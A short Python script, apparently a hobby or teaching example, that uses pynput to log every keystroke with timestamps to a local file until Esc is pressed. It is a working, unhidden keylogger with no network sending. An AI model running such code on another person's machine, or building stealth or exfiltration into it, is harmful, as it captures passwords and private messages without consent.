from pynput.keyboard import Listener , Key
import logging
import keyboard


log_file = "key_log.txt"


logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    logging.info(str(key))
    if key == Key.esc:
        logging.info("exit occured")
        return False

# Set up the listener
with Listener(on_press=on_press) as listener:
    listener.join()
